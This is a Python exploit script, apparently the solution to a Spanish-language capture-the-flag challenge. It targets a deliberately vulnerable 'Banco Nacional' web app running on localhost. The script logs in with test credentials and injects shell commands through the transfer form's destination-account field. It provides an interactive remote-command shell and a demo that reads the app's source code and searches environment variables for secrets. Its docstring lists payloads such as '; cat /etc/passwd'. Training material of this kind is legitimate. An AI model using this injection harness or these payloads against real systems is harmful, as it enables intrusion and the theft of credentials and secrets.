#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗  ██████╗███████╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗ ████████╗  ║
║   ██╔══██╗██╔════╝██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝  ║
║   ██████╔╝██║     █████╗      █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║     ║
║   ██╔══██╗██║     ██╔══╝      ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║     ║
║   ██║  ██║╚██████╗███████╗    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║     ║
║   ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ║
║                                                                              ║
║              SOLUCIÓN DESAFÍO RCE - BANCO NACIONAL                           ║
║              Vulnerabilidad: Remote Code Execution via Transferencias         ║
║              Autor: Script de Pentesting Automatizado                        ║
║              Nivel: AVANZADO                                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

FELICITACIONES! Has encontrado el script de explotación.

Este script demuestra cómo explotar la vulnerabilidad RCE en el sistema
de transferencias del Banco Nacional.

VECTORES DE ATAQUE:
===================

1. RECONOCIMIENTO:
   - Identificar el campo vulnerable: "cuenta_destino"
   - Confirmar que se usa subprocess.check_output() sin sanitización

2. INYECCIÓN DE COMANDOS:
   - Linux: ; ls -la
   - Windows: & dir
   - Universal: $(whoami) o `whoami`

3. EXFILTRACIÓN:
   - Lectura de archivos: ; cat /etc/passwd
   - Listado de directorio: ; find / -name "*.conf" 2>/dev/null
   - Información del sistema: ; uname -a

EJEMPLOS DE PAYLOADS:
=====================
"""

import requests
import sys
from colorama import init, Fore, Style

init(autoreset=True)

# Configuración
BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
TRANSFERENCIA_URL = f"{BASE_URL}/transferencia"

# Credenciales de prueba
USUARIO = "julian"
PASSWORD = "juli123"

class BancoRCEExploit:
    """Clase para explotar la vulnerabilidad RCE en el Banco Nacional"""
    
    def __init__(self):
        self.session = requests.Session()
        self.logged_in = False
    
    def banner(self):
        """Mostrar banner del exploit"""
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}  BANCO NACIONAL - EXPLOIT RCE (Remote Code Execution)")
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.GREEN}  [+] Target: {BASE_URL}")
        print(f"{Fore.GREEN}  [+] Vulnerabilidad: Inyección de comandos en transferencias")
        print(f"{Fore.CYAN}{'='*80}\n")
    
    def login(self):
        """Iniciar sesión en el sistema"""
        print(f"{Fore.YELLOW}[*] Intentando login con credenciales...")
        
        data = {
            "username": USUARIO,
            "password": PASSWORD
        }
        
        try:
            response = self.session.post(LOGIN_URL, data=data, allow_redirects=True)
            
            if "dashboard" in response.url or response.status_code == 200:
                print(f"{Fore.GREEN}[✓] Login exitoso como '{USUARIO}'")
                self.logged_in = True
                return True
            else:
                print(f"{Fore.RED}[✗] Login fallido")
                return False
        except Exception as e:
            print(f"{Fore.RED}[✗] Error en login: {e}")
            return False
    
    def ejecutar_comando(self, comando, descripcion=""):
        """Ejecutar comando mediante RCE"""
        if not self.logged_in:
            print(f"{Fore.RED}[✗] No has iniciado sesión")
            return None
        
        # Payload de inyección
        payload = f"; {comando}"
        
        print(f"\n{Fore.CYAN}{'─'*80}")
        if descripcion:
            print(f"{Fore.YELLOW}[*] {descripcion}")
        print(f"{Fore.MAGENTA}[>] Comando: {comando}")
        print(f"{Fore.MAGENTA}[>] Payload: {payload}")
        print(f"{Fore.CYAN}{'─'*80}")
        
        data = {
            "cuenta_destino": payload,
            "monto": "100"
        }
        
        try:
            response = self.session.post(TRANSFERENCIA_URL, data=data, allow_redirects=False)
            
            # Buscar el output en la respuesta
            if "error" in response.text.lower():
                # Extraer el mensaje de error que contiene el output del comando
                start = response.text.find("error")
                end = response.text.find("</", start)
                resultado = response.text[start:end] if end != -1 else response.text[start:start+500]
                
                print(f"{Fore.GREEN}[✓] Comando ejecutado!")
                print(f"{Fore.WHITE}[OUTPUT]:")
                print(f"{Fore.CYAN}{resultado}")
                return resultado
            else:
                print(f"{Fore.YELLOW}[!] Respuesta inesperada (posible ejecución exitosa)")
                return response.text[:200]
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Error ejecutando comando: {e}")
            return None
    
    def menu_interactivo(self):
        """Menú interactivo para el exploit"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}  MODO INTERACTIVO - SHELL RCE")
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.WHITE}  Comandos disponibles:")
        print(f"{Fore.GREEN}    - Ingresa cualquier comando Linux (ej: ls, pwd, whoami)")
        print(f"{Fore.GREEN}    - 'demo' - Ejecutar demo de comandos")
        print(f"{Fore.GREEN}    - 'exit' - Salir")
        print(f"{Fore.CYAN}{'='*80}\n")
        
        while True:
            try:
                comando = input(f"{Fore.YELLOW}RCE> {Fore.WHITE}").strip()
                
                if not comando:
                    continue
                
                if comando.lower() == 'exit':
                    print(f"{Fore.CYAN}[*] Saliendo...")
                    break
                
                if comando.lower() == 'demo':
                    self.demo_automatico()
                    continue
                
                self.ejecutar_comando(comando)
                
            except KeyboardInterrupt:
                print(f"\n{Fore.CYAN}[*] Interrupción detectada. Saliendo...")
                break
            except Exception as e:
                print(f"{Fore.RED}[✗] Error: {e}")
    
    def demo_automatico(self):
        """Ejecutar demostración automática de comandos"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}  DEMO AUTOMÁTICA - EXPLOTACIÓN RCE")
        print(f"{Fore.CYAN}{'='*80}\n")
        
        comandos_demo = [
            ("whoami", "Obtener usuario actual"),
            ("pwd", "Directorio de trabajo actual"),
            ("ls -la", "Listar archivos del directorio actual"),
            ("cat app_banco.py | head -20", "Leer primeras líneas del código fuente"),
            ("ps aux | grep python", "Procesos Python en ejecución"),
            ("env | grep -i secret", "Buscar variables de entorno con secretos"),
        ]
        
        for comando, descripcion in comandos_demo:
            self.ejecutar_comando(comando, descripcion)
            input(f"\n{Fore.YELLOW}[Presiona ENTER para continuar...]{Fore.WHITE}")


def main():
    """Función principal"""
    exploit = BancoRCEExploit()
    exploit.banner()
    
    # Login
    if not exploit.login():
        print(f"{Fore.RED}[✗] No se pudo iniciar sesión. Verifica las credenciales.")
        sys.exit(1)
    
    # Menú de opciones
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.YELLOW}  ¿Qué deseas hacer?")
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.WHITE}  [1] Modo Interactivo (shell RCE)")
    print(f"{Fore.WHITE}  [2] Demo Automática")
    print(f"{Fore.WHITE}  [3] Ejecutar un solo comando")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    opcion = input(f"{Fore.YELLOW}Selecciona una opción [1-3]: {Fore.WHITE}").strip()
    
    if opcion == "1":
        exploit.menu_interactivo()
    elif opcion == "2":
        exploit.demo_automatico()
    elif opcion == "3":
        comando = input(f"{Fore.YELLOW}Ingresa el comando a ejecutar: {Fore.WHITE}").strip()
        if comando:
            exploit.ejecutar_comando(comando)
    else:
        print(f"{Fore.RED}[✗] Opción inválida")
        sys.exit(1)
    
    print(f"\n{Fore.GREEN}[✓] Exploit completado!")
    print(f"{Fore.CYAN}{'='*80}\n")


if __name__ == "__main__":
    main()
